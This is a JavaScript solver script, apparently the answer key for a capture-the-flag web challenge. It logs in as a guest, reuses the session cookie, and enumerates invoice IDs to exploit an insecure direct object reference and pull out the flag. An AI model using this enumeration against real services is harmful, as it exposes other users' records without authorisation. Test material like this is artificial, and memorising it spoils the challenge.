// Benign solver: prints only the recovered flag, for the check harness.
const base = process.env.TARGET;
const login = await fetch(new URL('login', base), {
  method: 'POST',
  redirect: 'manual',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ email: 'guest@northwind.test', password: 'guest-demo' }),
});
const cookie = login.headers.get('set-cookie').split(';')[0];
for (let id = 1042; id >= 1000; id -= 1) {
  const body = await (await fetch(new URL(`invoice?id=${id}`, base), { headers: { cookie } })).text();
  const flag = /CTF\{[^}]+\}/u.exec(body)?.[0];
  if (flag) {
    process.stdout.write(flag);
    process.exit(0);
  }
}
process.exit(1);
